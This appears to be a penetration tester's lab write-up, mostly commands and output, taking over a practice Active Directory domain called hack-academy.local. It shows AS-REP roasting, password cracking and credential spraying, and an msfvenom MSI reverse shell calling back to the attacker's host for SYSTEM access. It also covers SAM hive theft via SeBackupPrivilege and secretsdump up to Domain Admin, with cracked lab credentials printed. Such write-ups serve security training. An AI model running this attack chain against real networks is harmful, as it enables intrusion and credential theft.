Start with target discovery
``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
```
![[Pasted image 20260812083902.png]]

nmap port scan for network:
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 --open -oN nmap.txt

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
65128/tcp open  unknown
65138/tcp open  unknown
65145/tcp open  unknown
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)

Nmap scan report for hack-academy.local (10.0.2.7)
Host is up (0.00024s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
49670/tcp open  unknown
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)

Nmap scan report for hack-academy.local (10.0.2.9)
Host is up (0.00024s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
49670/tcp open  unknown
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)

```

Got list of usernames
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ netexec ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\lfoster:Pindrop#1 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 23 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-11-18 14:12:30 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             18       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 18       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             lfoster                       2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             amorales                      2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             njenkins                      2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             icruz                         2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             lhayes                        2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             msimmons                      2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             egray                         2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             aprice                        2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             lrivera                       2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             cscott                        2025-11-18 14:12:30 1                                                                    
LDAP        10.0.2.4        389    DC01             jbailey                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             gturner                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             bparker                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             zbutler                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             hkelly                        2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             eramirez                      2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             jwarren                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             lpowell                       2025-11-18 14:12:31 1                                                                    
LDAP        10.0.2.4        389    DC01             adiaz                         2025-11-18 14:12:31 0                                                                    
LDAP        10.0.2.4        389    DC01             nhoward                       2025-11-18 14:12:31 1 
```
![[Pasted image 20260812084413.png]]

collect data from dc with bloodhound
``` sh
┌──(kali㉿kali)-[~/AD/bloodhound]
└─$ bloodhound-python -u "lfoster" -p 'Pindrop#1' -d hack-academy.local -c all --zip -ns 10.0.2.4      
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 24 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Client-2.hack-academy.local
INFO: Querying computer: Client-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 01S
INFO: Compressing output into 20260812014800_bloodhound.zip
```
![[Pasted image 20260812084833.png]]

Boot up bloodhound and I find that Adiaz user is ASREP-Roastable. This username we found earlier. So lets get roasting
![[Pasted image 20260812085429.png]]

Got hash:
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ impacket-GetNPUsers -dc-ip 10.0.2.4 'hack-academy.local/' -usersfile usernames -format hashcat
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

$krb5asrep$23$adiaz@HACK-ACADEMY.LOCAL:8372bc6bad149980952c381d198aab37$ad2f0408a83b561c37f87a095284ca89f7a884170d2e641233fc7327471ec14bf35f35204947e5a617cc19b0efedce8113b10e8cc62271e3afc8a21fba1bb7b5a9a24fd5e73ac4c22711bd2b7f2b7a4145c1efb1553ce465195c2545877cf16523e8a505e0cfbf200340a0e21feb6777eab499ef732fad26efbd7dc357786495aa0e379e3858a36496431b8ad395cb9273bd608734d77b775912f422c50e9867f64386378855edd06b40c9ecf2ef0b20169937fe1bae17aa07b247077e1ce62803af1cf3969d68d2bc90768361d5fb5a9e50792de8ac8fd75afe2613ad7d7996e210a1695f4e20475e66101d06a4d3779136b668e8e03f73
```
![[Pasted image 20260812085553.png]]

Cracked adiaz:Peru123.
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ john hash_adiaz --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Peru123.         ($krb5asrep$23$adiaz@HACK-ACADEMY.LOCAL) 
```
![[Pasted image 20260812085659.png]]

Spray the creds and found that we have rdp on Client2
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ netexec rdp ips -u adiaz -p Peru123.
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\adiaz:Peru123. (Pwn3d!)
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\adiaz:Peru123. 
```
![[Pasted image 20260812091116.png]]

Login via rdp to client2 and run powerup.ps1. Noticed that 
```
Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI
```
was present which we can leverage

made payload via msfvenom and moved to target:
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```

pop a listener on port 443 and move exploit to target and execute
![[Pasted image 20260812100431.png]]

and we get shell as SYSTEM. We add adiaz to admin group for better shell access via winrm
``` sh
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>net localgroup "Administrators" adiaz /add
net localgroup "Administrators" adiaz /add
```
![[Pasted image 20260812100520.png]]

confirm access with spray
![[Pasted image 20260812100603.png]]

Then we can dump secrets. We got interesting hashes for Jualia, Administrator, jbailey
``` sh
┌──(kali㉿kali)-[~/privesc/win]
└─$ impacket-secretsdump adiaz@10.0.2.9
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/Administrator:$DCC2$10240#Administrator#98827453f7494d0432f040c44ed08de4: (2025-09-03 00:58:04+00:00)
HACK-ACADEMY.LOCAL/jbailey:$DCC2$10240#jbailey#0860c5817e76d3945bd7bc8c9a188adc: (2025-08-30 13:05:10+00:00)
```
![[Pasted image 20260812100835.png]]

Cracked jbailey:Paulio*3
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ john hash_admin_client2 --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Paulio*3         (HACK-ACADEMY.LOCAL/jbailey)     

```
![[Pasted image 20260812102605.png]]

And sprayed the creds. We hace winrm on Client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ nxc winrm ips -u 'jbailey' -p 'Paulio*3' 
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [-] hack-academy.local\jbailey:Paulio*3
WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [-] hack-academy.local\jbailey:Paulio*3
WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\jbailey:Paulio*3 (Pwn3d!)
```
![[Pasted image 20260812102633.png]]

we got access. And we check privs... I think we need to do privesc as bloodhound didn't show anything interesting on jbailey and we haven't cracked the admin hash yet....

okay we have SeBackupPrivilege. We can exploit this.
``` sh
*Evil-WinRM* PS C:\temp> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ==============================================
hack-academy\jbailey S-1-5-21-1516340173-3939677173-1136271741-1115

<REDACTED>

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeBackupPrivilege             Back up files and directories        Enabled
```
![[Pasted image 20260812105437.png]]

exploit
``` sh
*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/12/2026  12:38 AM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> reg save hklmsam c:\Temp\sam
reg.exe : ERROR: Invalid key name.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid key name.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\temp> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\temp> dowwnload sam
The term 'dowwnload' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ dowwnload sam
+ ~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (dowwnload:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system
                                        
Info: Download successful!
```
![[Pasted image 20260812105515.png]]

and dump secrets offline. Got hash for Brian
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ impacket-secretsdump -system system -sam sam local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

<REDACTED>

Brian:1001:aad3b435b51404eeaad3b435b51404ee:a14e59515478dc73bab72add13f6c3a9:::

```
![[Pasted image 20260812105647.png]]

Cant find bryan on bloodhound so it might be local user on Client1. Sprayed the creds with username and hash and confirmed rdp access
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ nxc rdp ips -u 'Brian' -H a14e59515478dc73bab72add13f6c3a9 --local-auth
RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:CLIENT-1) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:CLIENT-2) (nla:True)
RDP         10.0.2.7        3389   CLIENT-1         [+] CLIENT-1\Brian:a14e59515478dc73bab72add13f6c3a9 (Pwn3d!)                                 
```
![[Pasted image 20260812110358.png]]

Could not pass the hash via rdp so cracked the hash with --format=NT
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ john hash_brian --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Iloveyou:D       (Brian)  
```
![[Pasted image 20260812111805.png]]

then rdp to client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'Brian' /p:'Iloveyou:D' /v:10.0.2.7

```

We are in admin group so we can dump secrets
``` sh
C:\Users\Brian>whoami
client-1\brian

C:\Users\Brian>whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
client-1\brian S-1-5-21-214714661-401411556-3779422230-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```
![[Pasted image 20260812112051.png]]

First add lfoster to admin group
``` sh
PS C:\Windows\system32> net localgroup "Administrators" lfoster /add                                                    The command completed successfully.                                
```

then we can dump secrets as lfoster. And we can see hash for amorales who we saw in bloodhound enum was Domain Admin. Se we try to crack that one
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ impacket-secretsdump lfoster@10.0.2.7

<REDACTED>

HACK-ACADEMY.LOCAL/amorales:$DCC2$10240#amorales#7a2ea8138101eee018583317ef708e51: (2025-09-03 19:41:06+00:00)

```

Cracked
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ john hash_amorales --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Seduction?1      (HACK-ACADEMY.LOCAL/amorales)   
```

nxc-sweep to confirms creds work
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD3/loot]
└─$ nxc-sweep 10.0.2.4 -u amorales -p 'Seduction?1'
[*] Starting NXC sweep for 10.0.2.4 as amorales ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.4        445    DC01             [+] hack-academy.local\amorales:Seduction?1 (Pwn3d!)
SMB         10.0.2.4        445    DC01             [*] Enumerated shares
SMB         10.0.2.4        445    DC01             Share           Permissions     Remark
SMB         10.0.2.4        445    DC01             -----           -----------     ------
SMB         10.0.2.4        445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.4        445    DC01             C$              READ,WRITE      Default share
SMB         10.0.2.4        445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.4        445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.0.2.4        445    DC01             SYSVOL          READ,WRITE      Logon server share 

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [+] hack-academy.local\amorales:Seduction?1 (Pwn3d!)
```
![[Pasted image 20260812113300.png]]

proof
``` sh
*Evil-WinRM* PS C:\Users\amorales\Documents> whoami;  hostname;  whoami /groups; ipconfig
hack-academy\amorales
DC01

GROUP INFORMATION
-----------------

Group Name                                          Type             SID                                           Attributes
=================================================== ================ ============================================= ===============================================================
Everyone                                            Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                       Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access          Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                              Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                                Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                    Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                      Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HACK-ACADEMY\Domain Admins                          Group            S-1-5-21-1516340173-3939677173-1136271741-512 Mandatory group, Enabled by default, Enabled group
HACK-ACADEMY\Denied RODC Password Replication Group Alias            S-1-5-21-1516340173-3939677173-1136271741-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                    Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                Label            S-1-16-12288

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::409c:8a16:c5fb:9329%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.4
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

```
![[Pasted image 20260812113533.png]]